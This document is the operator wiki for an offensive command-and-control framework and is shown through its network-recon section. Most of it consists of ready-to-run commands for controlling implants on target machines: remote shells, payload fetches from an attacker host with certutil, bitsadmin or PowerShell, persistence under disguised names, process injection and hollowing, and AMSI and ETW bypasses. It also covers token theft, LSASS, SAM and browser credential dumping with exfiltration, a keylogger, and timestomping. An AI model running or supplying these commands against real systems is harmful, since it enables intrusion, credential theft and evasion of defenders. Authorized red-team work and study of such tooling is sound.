# taburtuaiC2 — Operator Wiki

**Version** 3.0  ·  **Author** mjopsec  ·  **Platform** Windows / Linux / macOS

> **Scope** — Authorized penetration testing, red team engagements, and security research only.
> All agent activity is logged server-side. Ensure written authorization before deployment.

---

## Table of Contents

| # | Section |
|---|---------|
| 1 | [Architecture Overview](#1-architecture-overview) |
| 2 | [Build & Setup](#2-build--setup) |
| 3 | [Global Flags & Environment Variables](#3-global-flags--environment-variables) |
| 4 | [Interactive Console](#4-interactive-console) |
| 5 | [Agent Management](#5-agent-management) |
| 6 | [Command Execution & Shell](#6-command-execution--shell) |
| 7 | [File Operations](#7-file-operations) |
| 8 | [Process Management](#8-process-management) |
| 9 | [Persistence](#9-persistence) |
| 10 | [Queue Management](#10-queue-management) |
| 11 | [LOLBin Fetch](#11-lolbin-fetch) |
| 12 | [Alternate Data Streams (ADS)](#12-alternate-data-streams-ads) |
| 13 | [Process Injection](#13-process-injection) |
| 14 | [Advanced Injection](#14-advanced-injection) |
| 15 | [AMSI & ETW Bypass](#15-amsi--etw-bypass) |
| 16 | [Token Manipulation](#16-token-manipulation) |
| 17 | [Credential Access](#17-credential-access) |
| 18 | [Reconnaissance](#18-reconnaissance) |
| 19 | [Timestomping](#19-timestomping) |
| 20 | [Evasion — Sleep / Unhook / HWBP](#20-evasion--sleep--unhook--hwbp) |
| 21 | [BOF Execution](#21-bof-execution) |
| 22 | [OPSEC Checks & Time Gate](#22-opsec-checks--time-gate) |
| 23 | [Network Recon](#23-network-recon) |
| 24 | [Registry Operations](#24-registry-operations) |
| 25 | [SOCKS5 Proxy Pivot](#25-socks5-proxy-pivot) |
| 26 | [Stage Management](#26-stage-management) |
| 27 | [Implant Generator](#27-implant-generator) |
| 28 | [Server & Logs](#28-server--logs) |
| 29 | [Quick Reference Card](#29-quick-reference-card) |

---

## 1. Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                        OPERATOR MACHINE                          │
│                                                                  │
│   bin/operator  ── authenticated REST API ──────────────────┐   │
│   bin/generate  (implant builder CLI)                        │   │
│                                                              │   │
└──────────────────────────────────────────────────────────────│──┘
                              HTTPS / HTTP                     │
                                                               │
┌──────────────────────────────────────────────────────────────▼──┐
│                         C2 SERVER                                │
│                                                                  │
│   /api/v1/*        (authenticated operator API)                  │
│   /beacon          (agent check-in & command poll)               │
│   /stage/:token    (one-shot encrypted payload download)         │
│                                                                  │
│   SQLite DB  ──►  agents | commands | stages                     │
└────────────────────────────────────────┬────────────────────────┘
                              HTTPS / HTTP│
                                          │  beacon  (interval ± jitter)
┌─────────────────────────────────────────▼───────────────────────┐
│                       TARGET  (AGENT)                            │
│                                                                  │
│   Windows EXE (staged or stageless)                              │
│   ├─ AES-256-GCM encrypted comms                                 │
│   ├─ injection / evasion / credential access                     │
│   └─ SOCKS5 proxy (in-process)                                   │
└─────────────────────────────────────────────────────────────────┘
```

### Communication Flow

1. **Agent** checks in via `POST /beacon` with AES-GCM encrypted `AgentInfo`.
2. **Server** queues commands sent from the operator CLI.
3. **Agent** receives commands on next beacon cycle, executes, encrypts result, and returns it.
4. **Operator** polls via `status` or uses `--wait` for blocking receipt.

### Staged vs Stageless

| | Staged | Stageless |
|---|---|---|
| Initial payload size | ~2 MB (stager only) | 8–15 MB (full agent) |
| Network requirement at execution | Yes — downloads full agent | No |
| AV/EDR evasion | Better — payload only in memory | Depends on build flags |
| Best delivery | Phishing, ClickFix, HTA, VBA | USB drop, ISO, DLL sideload |

---

## 2. Build & Setup

### Prerequisites

| Tool | Purpose | Install |
|---|---|---|
| Go 1.21+ | Build everything | https://go.dev |
| `garble` | Obfuscated builds | `go install mvdan.cc/garble@latest` |
| `mingw-w64` | DLL cross-compilation | `apt install mingw-w64` |
| `donut` | PE-to-shellcode | https://github.com/TheWover/donut |

### Build All Components

```bash
# Build server + operator + generator + Windows agent (default)
make all

# Individual targets
make server             # bin/server
make operator           # bin/operator
make generate           # bin/generate  (implant builder)
make agent-windows      # bin/agent_windows.exe          (debug; has console)
make agent-win-stealth  # bin/agent_windows_stealth.exe  (no console, stripped)
make agent-win-garble   # bin/agent_windows_obf.exe      (garble obfuscated)
make agent-linux        # bin/agent_linux
make agent-darwin       # bin/agent_darwin
```

### Custom Agent Build

Override any parameter from the command line:

```bash
make agent-custom \
  C2_SERVER=https://c2.corp.example.com \
  ENC_KEY=MyKey1234567890X \
  SEC_KEY=SecondaryKey123X \
  INTERVAL=60 \
  JITTER=30 \
  KILL_DATE=2026-12-31 \
  WORK_START=8 \
  WORK_END=18
```

| Variable | Default | Description |
|---|---|---|
| `C2_SERVER` | `http://127.0.0.1:8080` | C2 URL baked into agent binary |
| `ENC_KEY` | `SpookyOrcaC2AES1` | AES-256 key (exactly 16 chars) |
| `SEC_KEY` | `TaburtuaiSecondary` | Secondary key |
| `INTERVAL` | `30` | Beacon interval in seconds |
| `JITTER` | `20` | Jitter percentage applied to interval |
| `KILL_DATE` | _(empty = never)_ | Auto-terminate date `YYYY-MM-DD` |
| `WORK_START` | _(empty)_ | Active window start hour `0–23` |
| `WORK_END` | _(empty)_ | Active window end hour `0–23` |

### Start the Server

```bash
# Default: listens on :8080
./bin/server

# With API authentication
export TABURTUAI_API_KEY=your_secure_token
./bin/server
```

---

## 3. Global Flags & Environment Variables

Every operator command accepts these persistent flags:

| Flag | Short | Env Variable | Default | Description |
|---|---|---|---|---|
| `--server` | `-s` | `TABURTUAI_SERVER` | `http://localhost:8080` | C2 server URL |
| `--api-key` | `-k` | `TABURTUAI_API_KEY` | — | Bearer authentication token |
| `--timeout` | `-t` | — | `30` | HTTP request timeout in seconds |
| `--verbose` | `-v` | — | `false` | Enable debug output |

**Recommended session setup:**

```bash
export TABURTUAI_SERVER=https://c2.corp.example.com
export TABURTUAI_API_KEY=your_secure_token

# Verify connectivity
./bin/operator agents list
```

### Agent ID Shorthand

All commands accept a full UUID **or** a unique prefix (6+ chars). The operator auto-resolves prefixes.

```bash
# Full UUID
./bin/operator shell a3f91c2d-4b87-4e6a-9b01-c2d5e7f83ab1

# Short prefix (resolved automatically)
./bin/operator shell a3f91c2d
```

---

## 4. Interactive Console

A Metasploit-style REPL. Set the server once at launch — no `--server` flag needed per command.

```bash
./bin/operator --server https://c2.corp.example.com --api-key mytoken console
```

```
taburtuai(c2.corp.example.com) › agents list
taburtuai(c2.corp.example.com) › shell a3f91c2d
taburtuai(c2.corp.example.com) › screenshot a3f91c2d --save /tmp/screen.png --wait
taburtuai(c2.corp.example.com) › creds lsass a3f91c2d --wait
```

**Console Tips**

- Tab-complete commands and flags.
- Both `'single'` and `"double"` quoting are supported with standard shell escaping.
- `help` or `<command> --help` shows inline usage.
- `Ctrl+C` cancels the current `--wait` without killing the queued operation on the agent.

---

## 5. Agent Management

### List Agents

```bash
./bin/operator agents list
```

Columns: `ID`, `Hostname`, `Username`, `OS/Arch`, `PID`, `Privileges`, `Last Seen`, `Status`

### Agent Info

```bash
./bin/operator agents info <agent-id>
```

Shows: IP address, working directory, beacon interval, kill date, encryption status.

### Delete Agent

```bash
./bin/operator agents delete <agent-id>
```

Removes the database record. The process on the target is **not** terminated — it will re-register on its next beacon.

---

## 6. Command Execution & Shell

### Single Command

```bash
./bin/operator cmd <agent-id> "<command>" [options]
```

| Flag | Default | Description |
|---|---|---|
| `--workdir`, `-w` | — | Change working directory before execution |
| `--background`, `-b` | `false` | Fire-and-forget; do not wait for result |
| `--timeout` | `300` | Seconds to wait for result |

```bash
# Run whoami and wait
./bin/operator cmd a3f91c2d "whoami /all"

# Run in a specific directory, background
./bin/operator cmd a3f91c2d "dir /s" --workdir "C:\Users\victim" --background

# Long-running command with extended timeout
./bin/operator cmd a3f91c2d "net user /domain" --timeout 120
```

### Interactive Shell

Starts a blocking REPL — each command is queued and waited on.

```bash
./bin/operator shell <agent-id> [--timeout <seconds>]
```

> **Important:** Set `--timeout` to at least 2× the agent's maximum beacon interval.
> For 60s interval + 30% jitter, use `--timeout 180` or higher.

```bash
# 30s beacon (default)
./bin/operator shell a3f91c2d

# 60s beacon with 30% jitter
./bin/operator shell a3f91c2d --timeout 180

# 5-minute stealth beacon
./bin/operator shell a3f91c2d --timeout 600
```

**Session example:**

```
[shell a3f91c2d] > whoami
NT AUTHORITY\SYSTEM

[shell a3f91c2d] > ipconfig /all
...

[shell a3f91c2d] > exit
```

### Check Command Status

```bash
./bin/operator status <command-id>
```

Returns: `pending`, `running`, `completed`, `failed`, plus output.

### Command History

```bash
./bin/operator history <agent-id> [--limit 50] [--status completed]
```

| Flag | Default | Description |
|---|---|---|
| `--limit`, `-l` | `50` | Number of records to return |
| `--status` | — | Filter: `pending`, `running`, `completed`, `failed` |

---

## 7. File Operations

### Upload (Operator → Agent)

Push a local file to the agent's filesystem:

```bash
./bin/operator files upload <agent-id> <local-file> <remote-path> [--wait]
```

```bash
# Upload a tool
./bin/operator files upload a3f91c2d ./tools/nc.exe "C:\Windows\Temp\svc.exe"

# Wait for delivery confirmation
./bin/operator files upload a3f91c2d ./payload.bin "C:\Temp\p.bin" --wait
```

### Download (Agent → Operator)

Pull a file from the agent back to the operator machine:

```bash
./bin/operator files download <agent-id> <remote-path> <local-path> [--wait]
```

```bash
# Pull an LSASS dump
./bin/operator files download a3f91c2d "C:\Windows\Temp\lsass.dmp" ./lsass.dmp --wait

# Pull SAM hive
./bin/operator files download a3f91c2d "C:\Temp\SAM" ./exfil/SAM --wait
```

> Files are base64-encoded over the AES-GCM channel. Large files may span multiple beacon cycles.

---

## 8. Process Management

### List Processes

```bash
./bin/operator process list <agent-id> [--wait]
```

Returns: `PID`, `Name`, `PPID`, `User`, `Integrity Level`

### Kill Process

```bash
./bin/operator process kill <agent-id> [--pid <n>] [--name <name>] [--wait]
```

| Flag | Description |
|---|---|
| `--pid`, `-p` | Kill by exact PID |
| `--name`, `-n` | Kill by process name (e.g., `notepad.exe`) |

```bash
./bin/operator process kill a3f91c2d --pid 4832 --wait
./bin/operator process kill a3f91c2d --name "defender.exe"
```

### Start Process

```bash
./bin/operator process start <agent-id> <process-path> [--args "..."] [--wait]
```

```bash
./bin/operator process start a3f91c2d "C:\Windows\System32\notepad.exe"
./bin/operator process start a3f91c2d "cmd.exe" --args "/c net user hacker P@ss /add" --wait
```

---

## 9. Persistence

### Setup

```bash
./bin/operator persistence setup <agent-id> \
  --method <method> \
  --path <exe-path> \
  [--name <entry-name>] \
  [--args "<arguments>"] \
  [--wait]
```

| Method | Platform | Mechanism |
|---|---|---|
| `registry_run` | Windows | `HKCU\…\CurrentVersion\Run` |
| `schtasks_onlogon` | Windows | Scheduled task on user logon |
| `schtasks_daily` | Windows | Scheduled task daily at current time |
| `startup_folder` | Windows | Shortcut in `%APPDATA%\…\Start Menu\Programs\Startup` |
| `cron_reboot` | Linux | `@reboot` entry in user crontab |
| `systemd_user` | Linux | Systemd user service unit |
| `bashrc` | Linux/macOS | Append exec line to `~/.bashrc` |
| `launchagent` | macOS | LaunchAgent plist in `~/Library/LaunchAgents/` |

```bash
# Windows registry run key
./bin/operator persistence setup a3f91c2d \
  --method registry_run \
  --path "C:\Windows\Temp\svc.exe" \
  --name "WindowsSecurityUpdate" \
  --wait

# Scheduled task on logon
./bin/operator persistence setup a3f91c2d \
  --method schtasks_onlogon \
  --path "C:\Temp\agent.exe" \
  --name "SystemHealthCheck" \
  --wait

# Linux cron
./bin/operator persistence setup a3f91c2d \
  --method cron_reboot \
  --path "/tmp/.agent" \
  --wait
```

### Remove

```bash
./bin/operator persistence remove <agent-id> \
  --method <method> \
  --name <entry-name> \
  [--wait]
```

```bash
./bin/operator persistence remove a3f91c2d \
  --method registry_run \
  --name "WindowsSecurityUpdate" \
  --wait
```

---

## 10. Queue Management

Commands are queued server-side and delivered on the agent's next beacon.

### View Queue Statistics

```bash
./bin/operator queue stats
```

Shows per-agent pending command counts and overall queue health.

### Clear Pending Commands

```bash
./bin/operator queue clear <agent-id>
```

Removes all `pending` commands for the agent. Already-running commands are unaffected.

---

## 11. LOLBin Fetch

Download a remote resource to the agent using built-in Windows binaries. Avoids introducing a downloader onto disk.

```bash
./bin/operator fetch <agent-id> <url> <remote-path> \
  [--method certutil|bitsadmin|curl|powershell] \
  [--wait] [--timeout N]
```

| Method | Binary | Notes |
|---|---|---|
| `certutil` _(default)_ | `certutil.exe` | Creates Sysmon network event |
| `bitsadmin` | `bitsadmin.exe` | Resembles Windows Update traffic; low noise |
| `curl` | `curl.exe` | Available Windows 10 1803+; clean HTTP |
| `powershell` | `powershell.exe` | `Net.WebClient.DownloadFile`; ScriptBlock logging risk |

```bash
# Default: certutil
./bin/operator fetch a3f91c2d http://10.10.10.1/nc.exe "C:\Temp\nc.exe" --wait

# BITS — lower detection surface
./bin/operator fetch a3f91c2d http://10.10.10.1/payload.bin "C:\Temp\p.bin" \
  --method bitsadmin --wait

# PowerShell
./bin/operator fetch a3f91c2d http://10.10.10.1/tool.exe "C:\Windows\Temp\tool.exe" \
  --method powershell --wait --timeout 120
```

---

## 12. Alternate Data Streams (ADS)

NTFS ADS hides data inside a file's secondary stream without changing its visible size. Used for payload stashing and LOLBin execution.

### Write

```bash
./bin/operator ads write <agent-id> <local-file> "<target-file:stream>" [--wait]
```

```bash
./bin/operator ads write a3f91c2d ./payload.js "C:\Windows\Temp\readme.txt:help.js"
```

### Read

```bash
./bin/operator ads read <agent-id> "<source-file:stream>" <local-path> [--wait]
```

```bash
./bin/operator ads read a3f91c2d "C:\Windows\Temp\readme.txt:help.js" ./retrieved.js
```

### Execute

Execute a script stored in an ADS using `wscript.exe` — the file never exists as a standalone path.

```bash
./bin/operator ads exec <agent-id> "<file:stream>" [--wait] [--timeout N]
```

```bash
./bin/operator ads exec a3f91c2d "C:\Windows\Temp\readme.txt:help.js" --wait --timeout 60
```

**API call:** `wscript.exe //E:jscript "C:\Windows\Temp\readme.txt:help.js"`

---

## 13. Process Injection

### Remote Injection

Inject shellcode into an existing remote process.

```bash
./bin/operator inject remote <agent-id> \
  --file <shellcode.bin> --pid <PID> \
  [--method crt|apc] [--wait] [--timeout N]
```

| Method | API Chain | EDR Risk |
|---|---|---|
| `crt` | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` | High |
| `apc` | `VirtualAllocEx` + `WriteProcessMemory` + `QueueUserAPC` | Medium |

```bash
# CRT injection
./bin/operator inject remote a3f91c2d \
  --file ./met_x64.bin --pid 5124 --method crt --wait

# APC injection (stealthier — requires alertable thread)
./bin/operator inject remote a3f91c2d \
  --file ./shellcode.bin --pid 5124 --method apc --wait
```

### Self Injection

Inject shellcode into the agent's own process — no cross-process memory writes.

```bash
./bin/operator inject self <agent-id> --file <shellcode.bin> [--wait] [--timeout N]
```

```bash
./bin/operator inject self a3f91c2d --file ./shellcode.bin --wait
```

**API chain:** `VirtualAlloc(RWX)` → `RtlMoveMemory` → `CreateThread`

### PPID Spoofing

Spawn a process on the agent with a spoofed parent PID. EDR and Sysmon see the child as belonging to the specified parent, defeating parent-chain detections.

```bash
./bin/operator inject ppid <agent-id> <exe-path> \
  [--ppid <pid>] [--ppid-name <name>] [--args "..."] [--wait]
```

```bash
# Spawn cmd.exe parented to explorer.exe
./bin/operator inject ppid a3f91c2d "cmd.exe" --ppid-name "explorer.exe"

# PowerShell hidden, parented to svchost
./bin/operator inject ppid a3f91c2d "powershell.exe" \
  --ppid-name "svchost.exe" \
  --args "-NoP -W Hidden -Enc <base64>" \
  --wait

# Explicit parent PID
./bin/operator inject ppid a3f91c2d "cmd.exe" --ppid 812
```

**API chain:** `InitializeProcThreadAttributeList` → `UpdateProcThreadAttribute(PARENT_PROCESS)` → `CreateProcess(EXTENDED_STARTUPINFO_PRESENT)`

---

## 14. Advanced Injection

These techniques minimize or eliminate `WriteProcessMemory` calls, which are heavily monitored by EDR products.

### Process Hollowing

Spawn a legitimate host process suspended, unmap its original code, map shellcode at the entry point, then resume. The process appears legitimate in Task Manager and EDR process trees.

```bash
./bin/operator hollow <agent-id> \
  --file <shellcode.bin> \
  [--exe "C:\Windows\System32\svchost.exe"] \
  [--wait] [--timeout N]
```

```bash
./bin/operator hollow a3f91c2d \
  --file ./shellcode.bin \
  --exe "C:\Windows\System32\RuntimeBroker.exe" \
  --wait
```

**API chain:** `CreateProcess(SUSPENDED)` → `NtUnmapViewOfSection` → `VirtualAllocEx` + `WriteProcessMemory` → `SetThreadContext (patch RIP)` → `ResumeThread`

### Thread Hijacking

Suspend the first enumerated thread of an existing process, redirect its RIP to shellcode, and resume. No new threads or processes are created.

```bash
./bin/operator hijack <agent-id> \
  --file <shellcode.bin> --pid <PID> \
  [--wait] [--timeout N]
```

```bash
./bin/operator hijack a3f91c2d --file ./shellcode.bin --pid 5124 --wait
```

**API chain:** `OpenThread(SUSPEND)` → `SuspendThread` → `VirtualAllocEx` + `WriteProcessMemory` → `GetThreadContext` → patch RIP → `SetThreadContext` → `ResumeThread`

### Module Stomping

Load a sacrificial legitimate DLL, then overwrite its `.text` section with shellcode. Execution originates from a legitimate DLL memory region — defeats scanners that only flag private RWX allocations.

```bash
./bin/operator stomp <agent-id> \
  --file <shellcode.bin> \
  [--dll "C:\Windows\System32\version.dll"] \
  [--wait] [--timeout N]
```

```bash
./bin/operator stomp a3f91c2d \
  --file ./shellcode.bin \
  --dll "C:\Windows\System32\amsi.dll" \
  --wait
```

**API chain:** `LoadLibraryA(sacrificial)` → parse PE → `VirtualProtect(RWX)` → overwrite `.text` → `VirtualProtect(RX)` → `CreateThread` at DLL base + offset

### Section Mapping Injection

Inject via `NtCreateSection` + `NtMapViewOfSection` without calling `WriteProcessMemory`. Bypasses EDR hooks on `WriteProcessMemory` entirely.

```bash
./bin/operator mapinject <agent-id> \
  --file <shellcode.bin> \
  [--pid <PID>] \
  [--wait] [--timeout N]
```

```bash
# Self-inject via section mapping
./bin/operator mapinject a3f91c2d --file ./shellcode.bin --wait

# Remote inject (no WriteProcessMemory)
./bin/operator mapinject a3f91c2d --file ./shellcode.bin --pid 5124 --wait
```

**API chain:** `NtCreateSection(SEC_COMMIT|PAGE_EXECUTE_READWRITE)` → `NtMapViewOfSection` (self, write) → `NtMapViewOfSection` (target, PAGE_EXECUTE_READ) → `NtCreateThreadEx`

### Injection Technique Comparison

| Technique | New RWX Alloc | WriteProcessMemory | New Thread | EDR Detection Risk |
|---|---|---|---|---|
| `inject remote --method crt` | Yes | Yes | Yes | High |
| `inject remote --method apc` | Yes | Yes | Via APC | Medium |
| `inject self` | Yes | No | Yes | Medium |
| `hollow` | Yes | Yes | No (patches EP) | Medium |
| `hijack` | Yes | Yes | No (patches thread RIP) | Medium |
| `stomp` | No (DLL memory) | No | Yes | Low |
| `mapinject` | Via section | No | Yes | Low |

---

## 15. AMSI & ETW Bypass

### AMSI Bypass

Patches `amsi.dll!AmsiScanBuffer` with a `AMSI_RESULT_CLEAN` stub. Disables PowerShell/WSH content scanning in the target process.

```bash
./bin/operator bypass amsi <agent-id> [--pid <PID>] [--wait] [--timeout N]
```

| `--pid` | Behavior |
|---|---|
| `0` (default) | Patch AMSI in the agent's own process |
| `<PID>` | Patch AMSI in a remote process (requires same user or SeDebugPrivilege) |

```bash
# Disable AMSI in agent process
./bin/operator bypass amsi a3f91c2d --wait

# Disable AMSI in a PowerShell process before running a script
./bin/operator bypass amsi a3f91c2d --pid 7832 --wait
```

### ETW Bypass

Patches `ntdll.dll!EtwEventWrite` with a `ret` stub. Disables ETW-based telemetry including Windows Defender and many EDR sensors.

```bash
./bin/operator bypass etw <agent-id> [--pid <PID>] [--wait] [--timeout N]
```

```bash
./bin/operator bypass etw a3f91c2d --wait
./bin/operator bypass etw a3f91c2d --pid 4 --wait
```

> **Best practice:** Run `bypass amsi` + `bypass etw` + `evasion unhook` together before any injection or .NET operations.

---

## 16. Token Manipulation

### List Tokens

Enumerate running processes with their associated token, user context, and integrity level. Use this output to find a suitable steal target.

```bash
./bin/operator token list <agent-id> [--wait] [--timeout N]
```

Output columns: `PID`, `Process`, `User`, `Integrity`, `Privileges`

### Steal / Impersonate Token

Duplicate the primary token of a process and impersonate it on the current thread.

```bash
./bin/operator token steal <agent-id> --pid <PID> [--wait] [--timeout N]
```

```bash
# Steal SYSTEM token from winlogon.exe
./bin/operator token steal a3f91c2d --pid 524 --wait
```

**API chain:** `OpenProcess(QUERY_INFORMATION)` → `OpenProcessToken` → `DuplicateTokenEx` → `ImpersonateLoggedOnUser`

### Make Token (Pass-the-Credentials)

Create a token via `LogonUser` using known credentials. Enables lateral movement without an existing process to steal from.

```bash
./bin/operator token make <agent-id> \
  --user <username> --domain <domain> --pass <password> \
  [--wait] [--timeout N]
```

```bash
# Local administrator
./bin/operator token make a3f91c2d \
  --user Administrator --domain . --pass "P@ssw0rd!" --wait

# Domain account
./bin/operator token make a3f91c2d \
  --user jdoe --domain CORP --pass "Summer2024!" --wait
```

### Revert Token

Drop impersonation and return the thread to its original security context.

```bash
./bin/operator token revert <agent-id> [--wait]
```

**API:** `RevertToSelf()`

### Typical Token Workflow

```bash
# 1. Find a SYSTEM process
./bin/operator token list a3f91c2d --wait

# 2. Steal SYSTEM token (e.g. winlogon PID 524)
./bin/operator token steal a3f91c2d --pid 524 --wait

# 3. Confirm privilege
./bin/operator shell a3f91c2d
  [shell] > whoami
  NT AUTHORITY\SYSTEM

# 4. Revert when done
./bin/operator token revert a3f91c2d --wait
```

---

## 17. Credential Access

### LSASS Memory Dump

Dump LSASS via `MiniDumpWriteDump`. Parse offline with Mimikatz or pypykatz.

```bash
./bin/operator creds lsass <agent-id> [--output <remote-path>] [--wait] [--timeout N]
```

```bash
# Default output: %TEMP%\lsass.dmp
./bin/operator creds lsass a3f91c2d --wait

# Custom output path (blend in with crash dumps)
./bin/operator creds lsass a3f91c2d \
  --output "C:\Windows\Temp\wer.dmp" --wait

# Exfiltrate
./bin/operator files download a3f91c2d "C:\Windows\Temp\wer.dmp" ./lsass.dmp --wait
```

**Parse offline:**

```bash
# Mimikatz
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit

# pypykatz (Linux/macOS)
pypykatz lsa minidump lsass.dmp
```

### SAM / SYSTEM / SECURITY Hive Dump

Save the SAM, SYSTEM, and SECURITY registry hives. Contains local NTLM hashes.

```bash
./bin/operator creds sam <agent-id> [--dir <remote-dir>] [--wait] [--timeout N]
```

```bash
./bin/operator creds sam a3f91c2d --dir "C:\Windows\Temp" --wait

# Exfiltrate all three hives
./bin/operator files download a3f91c2d "C:\Windows\Temp\SAM"    ./SAM    --wait
./bin/operator files download a3f91c2d "C:\Windows\Temp\SYSTEM" ./SYSTEM --wait

# Extract hashes offline
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Browser Credentials

Harvest saved passwords from Chrome, Edge, Brave, and Firefox using `CryptUnprotectData` to decrypt the credential store.

```bash
./bin/operator creds browser <agent-id> [--wait] [--timeout N]
```

```bash
./bin/operator creds browser a3f91c2d --wait --timeout 60
```

Output: `[Browser] URL  user=<user>  pass=<pass>`

### Clipboard Read

Read the current Windows clipboard contents (text).

```bash
./bin/operator creds clipboard <agent-id> [--wait] [--timeout N]
```

```bash
./bin/operator creds clipboard a3f91c2d --wait
```

---

## 18. Reconnaissance

### Screenshot

Capture the full desktop via GDI `BitBlt`, returned as a PNG over the C2 channel.

```bash
./bin/operator screenshot <agent-id> [--save <local-path>] [--wait] [--timeout N]
```

```bash
# Capture and save to disk
./bin/operator screenshot a3f91c2d --save /tmp/target_desktop.png --wait

# Capture only (prints size; use --save to write to disk)
./bin/operator screenshot a3f91c2d --wait
```

**API chain:** `GetDC` → `CreateCompatibleBitmap` → `BitBlt` → `GetDIBits` → PNG encode → base64

### Keylogger

#### Start

```bash
./bin/operator keylog start <agent-id> [--duration <seconds>] [--wait] [--timeout N]
```

```bash
# Run until manually stopped
./bin/operator keylog start a3f91c2d

# Auto-stop after 5 minutes
./bin/operator keylog start a3f91c2d --duration 300
```

#### Dump Buffer

Retrieve buffered keystrokes. Buffer is **not** cleared after dump.

```bash
./bin/operator keylog dump <agent-id> [--timeout N]
```

#### Stop

Stop the keylogger and return the final buffer.

```bash
./bin/operator keylog stop <agent-id> [--timeout N]
```

**Implementation:** `GetAsyncKeyState` polling at 10 ms intervals; output includes active window title per keystroke group.

---

## 19. Timestomping

Modify a file's MACE timestamps to defeat forensic timeline analysis.

```bash
./bin/operator timestomp <agent-id> <target-file> \
  [--ref <reference-file>] \
  [--time <RFC3339>] \
  [--wait] [--timeout N]
```

| Option | Behavior |
|---|---|
| _(no flag)_ | Copy timestamps from `C:\Windows\System32\kernel32.dll` |
| `--ref <file>` | Copy from a specific reference file |
| `--time <RFC3339>` | Set an explicit arbitrary timestamp |

```bash
# Default: copy from kernel32.dll (file appears to be from Windows install)
./bin/operator timestomp a3f91c2d "C:\Users\victim\drop.exe" --wait

# Copy from a specific legitimate reference file
./bin/operator timestomp a3f91c2d "C:\Temp\tool.exe" \
  --ref "C:\Windows\explorer.exe" --wait

# Set explicit old timestamp
./bin/operator timestomp a3f91c2d "C:\Temp\tool.exe" \
  --time 2019-03-15T08:30:00Z --wait
```

**API chain:** `CreateFile(FILE_WRITE_ATTRIBUTES)` → `GetFileTime` (from ref) → `SetFileTime` (on target)

---

## 20. Evasion — Sleep / Unhook / HWBP

### Sleep Obfuscation

Encrypts the agent's own memory region with XOR during beacon sleep. In-memory scanners that run during idle periods see only encrypted garbage instead of readable shellcode.

```bash
./bin/operator evasion sleep <agent-id> --duration <seconds> [--wait] [--timeout N]
```

```bash
./bin/operator evasion sleep a3f91c2d --duration 60 --wait
```

**Implementation:** `VirtualProtect(PAGE_NOACCESS)` → XOR region → `Sleep` → XOR decrypt → `VirtualProtect(PAGE_EXECUTE_READ)`

### NTDLL Unhooking

Restores the `.text` section of `ntdll.dll` from a clean copy read directly from disk, overwriting any inline hooks injected by EDR products.

```bash
./bin/operator evasion unhook <agent-id> [--wait] [--timeout N]
```

```bash
./bin/operator evasion unhook a3f91c2d --wait
```

**Implementation:** Map `\KnownDlls\ntdll.dll` → read clean `.text` → `VirtualProtect(RW)` → copy bytes → `VirtualProtect(RX)`

> Run `evasion unhook` **before** any injection or credential dumping operations.

### Hardware Breakpoints (HWBP)

Install hardware execute-breakpoints on arbitrary function addresses (DR0–DR3) via VEH. Intercepts monitored APIs such as `EtwEventWrite` or `AmsiScanBuffer` without patching memory — invisible to memory integrity scanners.

#### Set

```bash
./bin/operator evasion hwbp set <agent-id> \
  --addr <hex-address> \
  [--register <0-3>] \
  [--wait] [--timeout N]
```

```bash
# Set breakpoint on EtwEventWrite
./bin/operator evasion hwbp set a3f91c2d \
  --addr 0x7FFEF1234560 --register 0 --wait
```

#### Clear

```bash
./bin/operator evasion hwbp clear <agent-id> [--register <0-3>] [--wait] [--timeout N]
```

```bash
./bin/operator evasion hwbp clear a3f91c2d --register 0 --wait
```

**Implementation:** `AddVectoredExceptionHandler` → VEH fires `EXCEPTION_SINGLE_STEP` at target → custom callback → re-arm breakpoint

---

## 21. BOF Execution

Execute a Beacon Object File (COFF `.o`) in-process on the agent. BOFs run in the agent's thread — no new process or injection required. Compatible with the Cobalt Strike BOF format.

```bash
./bin/operator bof <agent-id> <coff.o> [--args-file <packed-args.bin>] [--wait] [--timeout N]
```

```bash
# Run a BOF with no arguments
./bin/operator bof a3f91c2d ./bofs/whoami.o --wait

# Run with a packed arguments file
./bin/operator bof a3f91c2d ./bofs/ls.o --args-file ./args.bin --wait --timeout 30
```

**BOF API supported:** `BeaconPrintf`, `BeaconOutput`, `BeaconDataParse`, `BeaconDataInt`, `BeaconDataShort`, `BeaconDataExtract`, `BeaconFormatAlloc`, `BeaconFormatPrintf`, `BeaconFormatFree`, `BeaconFormatToOutput`

**Implementation:** Parse COFF sections → allocate RWX → apply relocations → resolve imports against BeaconAPI + real Win32 → call `go` export

---

## 22. OPSEC Checks & Time Gate

### Anti-Debug Check

Probes for debugger presence using multiple independent detection vectors.

```bash
./bin/operator opsec antidebug <agent-id> [--wait] [--timeout N]
```

```bash
./bin/operator opsec antidebug a3f91c2d --wait
```

**Checks:** `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, `NtQueryInformationProcess(ProcessDebugPort)`, heap flags, `GetTickCount64` timing delta, `OutputDebugString` response

Exit code `0` = clean / `1` = debugger detected.

### Anti-VM Check

Detects sandbox and virtual machine artifacts.

```bash
./bin/operator opsec antivm <agent-id> [--wait] [--timeout N]
```

```bash
./bin/operator opsec antivm a3f91c2d --wait
```

**Checks:** `vmtoolsd.exe`, `vboxservice.exe` process presence, CPU hypervisor bit (WMIC), screen resolution < 800×600, RAM < 2 GB, CPUID hypervisor flag

### Time Gate

Restricts beacon to configured working hours and auto-terminates on a kill date.

```bash
./bin/operator opsec timegate <agent-id> \
  [--start <hour>] [--end <hour>] \
  [--kill-date <YYYY-MM-DD>] \
  [--wait] [--timeout N]
```

```bash
# Active 08:00–18:00 only; kill December 31 2026
./bin/operator opsec timegate a3f91c2d \
  --start 8 --end 18 \
  --kill-date 2026-12-31 \
  --wait

# Kill date only (24/7 beacon until date)
./bin/operator opsec timegate a3f91c2d --kill-date 2026-06-01 --wait
```

> Commands queued outside the active window are held until the next in-window beacon. Set operator `--timeout` accordingly.

---

## 23. Network Recon

### Port Scan

Concurrent TCP scanner running fully on the agent. No traffic originates from the operator machine.

Invoked via raw operation type `net_scan` (Phase 11). Parameters are passed in the command payload:

| Field | Default | Description |
|---|---|---|
| `scan_targets` | required | Array of IPs or CIDRs: `["192.168.1.0/24","10.10.10.5"]` |
| `scan_ports` | 28 common ports | Array of port integers |
| `scan_timeout` | `500` | ms per probe |
| `scan_workers` | `200` | Concurrent goroutines |
| `scan_grab_banners` | `false` | Grab first-response banner |
